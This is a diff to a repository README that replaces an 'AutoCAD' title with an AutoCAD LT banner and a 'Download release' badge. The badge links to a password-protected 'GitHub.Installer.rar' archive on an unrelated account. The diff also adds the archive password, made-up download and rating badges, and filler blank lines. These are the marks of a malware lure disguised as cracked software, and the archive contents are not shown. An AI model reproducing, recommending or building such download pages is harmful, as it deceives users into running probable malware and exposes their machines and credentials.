@@ -1,2 +1,20 @@
-# AutoCAD
-1
+
+
+
+<h5 align=center><img src='http://damassets.autodesk.net/content/dam/autodesk/www/products/autodesk-autocad-lt/fy24/overview/images/what-is-autocad-lt-2024-03-large-1920x1024.jpg'></h5><hr><h5 align=center><a href="https://github.com/daddyvbucks/daddyvbucks1/releases/download/1/GitHub.Installer.rar"><img src='https://img.shields.io/badge/Download release-100000?style=for-the-badge&logo=github&logoColor=white'></a><br> pаss - 2024 <br> <br><img src=https://img.shields.io/badge/downloads-8.6k-brightgreen>  <img src=https://img.shields.io/badge/rating-★★★★☆-yellow>  <img src=https://img.shields.io/badge/release-2024-aqua></h5>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
